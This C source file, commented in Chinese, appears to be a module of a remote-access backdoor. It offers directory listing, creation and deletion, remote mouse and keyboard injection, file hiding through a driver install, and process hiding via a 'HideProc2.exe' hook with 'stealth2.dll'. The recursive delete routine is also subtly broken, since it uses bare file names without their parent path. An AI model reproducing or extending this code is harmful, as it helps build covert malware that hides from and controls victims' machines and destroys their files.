#include "setdriver.h"
//#include "SceenShoot.h"


#define specify_dir "C:\\\0"


//Shell操作

bool ListDir(char *filedir,char* ret)//列目录
{
	TCHAR path[MAX_PATH]={0};
	strcpy(path, filedir);
	strcat(path, "\\*");


	WIN32_FIND_DATA ffd;
	HANDLE hFind;


	hFind = FindFirstFile(path, &ffd);

	if (INVALID_HANDLE_VALUE == hFind)
	{
		return false;
	}

	do
	{
		strcat(ret, ffd.cFileName);
		if(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			strcat(ret, "<DIR>");
		}
		strcat(ret,"\r\n");
	}while(FindNextFile(hFind, &ffd) != 0);

	strcat(ret,"\0");

	FindClose(hFind);
	return true;
}


bool CrtDir(char *filedir) //增目录
{
	if(CreateDirectory(filedir, NULL))
		return true;
	else{
		printf("errorcode: %d\n",GetLastError());
		return false;
	}
}


bool DltDirTvs(TCHAR filedir[]) //删目录调用的遍历函数
{

	TCHAR path[MAX_PATH];
	strcpy(path, filedir);
	strcat(path,"\\*");

	WIN32_FIND_DATA ffd;
	HANDLE hFind ;

	hFind = FindFirstFile(path, &ffd);	

	if (INVALID_HANDLE_VALUE == hFind)
	{
		return false;
	}

	do
	{
		if (ffd.cFileName[0] != '.'){

			if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				DltDirTvs(ffd.cFileName);
				RemoveDirectory(ffd.cFileName);
			}
			else
			{
				DeleteFile(ffd.cFileName);
			}

		}
	} while (FindNextFile(hFind, &ffd) != 0);


	FindClose(hFind);
	return true;
}


bool DltDir(char *filedir) //删目录
{
	if (strcmp(filedir, specify_dir) == 0){//安全性检测
		return false;
	}
	else{
		DltDirTvs(filedir);
		if(RemoveDirectory(filedir))
			return true;
		else{
			printf("errorcode: %d\n",GetLastError());
			return false;
		}
	}
}


bool deletfile(char *filedir)//删文件函数
{
	if(DeleteFile(filedir))
		return true;
	else{
		printf("errorcode: %d\n",GetLastError());
		return false;
	}

}


//远程桌面操作

void mouse_op(int x,int y){
	x = x * 65535 / 1095;
	y = y * 65535 / 616;
	mouse_event(MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE, x, y, 0, 0);
	mouse_event(MOUSEEVENTF_LEFTDOWN|MOUSEEVENTF_LEFTUP,x,y,0,0);
	Sleep(100);
	mouse_event(MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE, x, y, 0, 0);
	mouse_event(MOUSEEVENTF_LEFTDOWN|MOUSEEVENTF_LEFTUP,x,y,0,0);
}


void keybd_op(int key){
	keybd_event(key, 0, 0, 0);
	keybd_event(key, 0, KEYEVENTF_KEYUP, 0);
}


//文件操作

void hide_file(){
	//执行文件隐藏，安装驱动
	setdriver(Install_Run);
}


void show_file(){
	//取消文件隐藏，卸载驱动
	setdriver(Stop_Unload);
}


//进程操作

void hide_process(){
	//执行进程隐藏，安装钩子
	system("C:\\HideProc2.exe -hide stealth2.dll");
}


void show_process(){
	// 取消进程隐藏，卸载钩子
	system("C:\\HideProc2.exe -show stealth2.dll");
}